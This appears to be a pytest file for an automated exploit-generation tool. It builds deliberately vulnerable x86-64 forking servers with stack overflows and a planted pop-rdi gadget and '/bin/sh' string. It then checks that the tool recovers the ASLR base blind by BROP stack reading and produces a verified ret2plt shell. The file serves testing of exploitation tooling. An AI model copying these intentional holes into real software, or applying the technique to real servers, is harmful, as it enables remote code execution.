"""No-win, no-leak PIE base recovery via BROP stack reading, against a forking server.

The hardest leak-free-PIE case: a forking server with a stack overflow but NO win() and NO pointer
ever printed. A server that responds ONLY AFTER the vulnerable function returns gives a
crash-vs-survived oracle, and that oracle reads the saved return address off the stack one byte at a
time (the byte that survives is the real one) -- recovering a live code pointer, and thus the PIE
base, with no information leak at all. This defeats ASLR on exactly the target the leak-first path
and the partial-overwrite path cannot. x86-64 native (we spawn and dial localhost).
"""
import os
import re
import shutil
import signal
import subprocess

import pytest
from lykos.analyze.dynamic import sandbox

pytestmark = pytest.mark.skipif(
    sandbox.host_arch() != "x86-64" or not shutil.which("gcc"),
    reason="BROP stack-reading fixture + socket oracle are native x86-64 only")

# A PIE forking server with NO win(). handle() reads (overflow) then RETURNS; main writes "OK" only
# after handle returns, so a corrupted saved return address (crash) suppresses the response -- the
# crash-vs-survived oracle the stack read needs.
_SRV = r'''
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
void handle(int fd){ char b[64]; read(fd,b,512); }
int main(void){
    signal(SIGCHLD, SIG_IGN);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    int one=1; setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&one,sizeof one);
    struct sockaddr_in a; memset(&a,0,sizeof a);
    a.sin_family=AF_INET; a.sin_addr.s_addr=INADDR_ANY; a.sin_port=0;
    if(bind(s,(void*)&a,sizeof a)) return 1;
    listen(s,16);
    for(;;){ int c=accept(s,0,0); if(c<0) continue;
        if(fork()==0){ close(s); handle(c); write(c,"OK\n",3); close(c); _exit(0);} close(c);} }
'''


@pytest.fixture(scope="module")
def srv(tmp_path_factory):
    gcc = shutil.which("gcc") or shutil.which("cc")
    d = tmp_path_factory.mktemp("brop_read")
    (d / "s.c").write_text(_SRV)
    exe = d / "s"
    if subprocess.run([gcc, "-fPIE", "-pie", "-fno-stack-protector", "-w", str(d / "s.c"),
                       "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build BROP stack-reading fixture")
    return exe


def _return_site_off(exe) -> int:
    """The static image offset of the instruction after `call <handle>` -- the value the saved
    return address holds, used to turn the recovered return address into the image base. Read from
    the disassembly (objdump), so the test does not hard-code a build-specific number."""
    objdump = shutil.which("objdump")
    if not objdump:
        pytest.skip("objdump needed to locate the return site")
    out = subprocess.run([objdump, "-d", str(exe)], capture_output=True, text=True).stdout
    lines = out.splitlines()
    for i, ln in enumerate(lines):
        if re.search(r"call\s+[0-9a-f]+ <handle>", ln) and i + 1 < len(lines):
            m = re.match(r"\s*([0-9a-f]+):", lines[i + 1])      # addr of the next instruction
            if m:
                return int(m.group(1), 16)
    pytest.skip("could not locate the call to handle()")


def test_recovers_pie_base_with_no_leak_and_no_win(srv):
    """Spawn the server under REAL ASLR, recover its image base with no leak and no win() by stack
    reading the saved return address, and confirm it EXACTLY matches the base the kernel actually
    chose (read from /proc only to grade the result -- the technique never sees it)."""
    from lykos.analyze.poc import brop
    ret_site = _return_site_off(srv)
    proc = brop.spawn_server(str(srv), [])
    assert proc, "could not spawn the server"
    try:
        port = brop.wait_for_port(proc, timeout=5)
        assert port, "server never listened"
        actual = int(open("/proc/%d/maps" % proc.pid).readline().split("-")[0], 16)
        survives = brop.make_survive_oracle(port, timeout=0.4, tries=2)
        res = brop.recover_pie_base_blind(survives, ret_site_off=ret_site)
        assert res, "blind base recovery failed"
        base, ra, offset = res
        assert base == actual, f"recovered base {base:#x} != actual {actual:#x}"
        assert ra == actual + ret_site, "recovered return address is inconsistent with the base"
    finally:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except Exception:                                # noqa: BLE001
            pass


def test_survive_oracle_distinguishes_crash_from_return(srv):
    """The oracle itself: a short write (buffer intact) returns normally and the server responds;
    an over-long all-A write corrupts the saved return address and the child crashes before the
    response -- the signal the stack read is built on."""
    from lykos.analyze.poc import brop
    proc = brop.spawn_server(str(srv), [])
    assert proc
    try:
        port = brop.wait_for_port(proc, timeout=5)
        survives = brop.make_survive_oracle(port, timeout=0.4, tries=2)
        assert survives(b"A" * 8), "a harmless short write should return and respond"
        assert not survives(b"A" * 200), "a return-address-clobbering overflow should crash"
    finally:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except Exception:                                # noqa: BLE001
            pass


# A no-win forking server that ALSO imports system + has a "/bin/sh" string + a pop-rdi gadget +
# dup2's the client socket -> the full BROP-to-shell target (base recovered blind, then ret2plt).
_SHELL_SRV = r'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
const char *SH = "/bin/sh";
void gadget(void){ __asm__ __volatile__("pop %rdi; ret"); }
void handle(int fd){ char b[64]; read(fd,b,512); }
int main(void){
    signal(SIGCHLD, SIG_IGN);
    if (getenv("IMPOSSIBLE_XYZZY")) system("/bin/true");   /* imports system; never runs; main is not a win */
    if (SH[0]==0) return 9;                                /* keep "/bin/sh" in .rodata */
    int s=socket(AF_INET,SOCK_STREAM,0); int one=1;
    setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&one,sizeof one);
    struct sockaddr_in a; memset(&a,0,sizeof a); a.sin_family=AF_INET; a.sin_addr.s_addr=INADDR_ANY; a.sin_port=0;
    if(bind(s,(void*)&a,sizeof a)) return 1; listen(s,16);
    for(;;){ int c=accept(s,0,0); if(c<0) continue;
        if(fork()==0){ close(s); dup2(c,0);dup2(c,1);dup2(c,2); handle(c); write(c,"OK\n",3); close(c); _exit(0);} close(c);} }
'''


@pytest.fixture(scope="module")
def shell_srv(tmp_path_factory):
    gcc = shutil.which("gcc") or shutil.which("cc")
    d = tmp_path_factory.mktemp("brop_shell")
    (d / "s.c").write_text(_SHELL_SRV)
    exe = d / "s"
    if subprocess.run([gcc, "-fPIE", "-pie", "-fno-stack-protector", "-w", str(d / "s.c"),
                       "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build BROP-shell fixture")
    return exe


@pytest.fixture
def _stage(store):
    from lykos.analyze import register
    from lykos.jobs import JobConfig, WorkerPool
    register()
    p = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    p.start()
    try:
        yield p
    finally:
        p.stop(grace=3.0)


def test_stage_files_l3_full_brop_no_win_no_leak_shell(store, _stage, shell_srv):
    """End-to-end through build_exploit: a PIE forking server with NO win() and NO leak reaches a
    confirmed L3 -- the base is recovered by stack reading and a ret2plt system('/bin/sh') chain
    rebased onto it spawns a shell that evaluates the forgery-proof marker. find_win must be empty
    (truly no-win) or this is testing the wrong path."""
    from lykos.analyze.disassemble import enqueue_disassemble
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.analyze.poc import exploit as _exploit
    from lykos.db.dao import PocDAO, TargetDAO
    from lykos.jobs import JobQueue
    assert _exploit.find_win(_exploit.elf_functions(shell_srv.read_bytes()))[1] is None, \
        "fixture unexpectedly has a win() -- would not exercise the no-win BROP-shell path"
    t = ingest(store, store.cases.create("bsh").id, shell_srv, filename="s")
    q = JobQueue(store.conn)
    for fn in (enqueue_triage, enqueue_disassemble):
        fn(q, t, force=True)
        assert _stage.wait_idle(60)
    TargetDAO(store.conn).update_triage(t.id, arch="x86-64", bits=64, endianness="little",
                                        linking="dynamic", stripped=False,
                                        mitigations={"pie": "on"}, file_type="elf")
    run = enqueue_exploit(q, t, params={"strategy": "ret2win"})
    assert _stage.wait_idle(240) and q.runs.get(run.id).status == "done"
    pocs = [pc for pc in PocDAO(store.conn).list_by_target(t.id) if pc.level == "L3" and pc.verified]
    assert pocs, "no confirmed L3 full-BROP shell PoC for the no-win server"
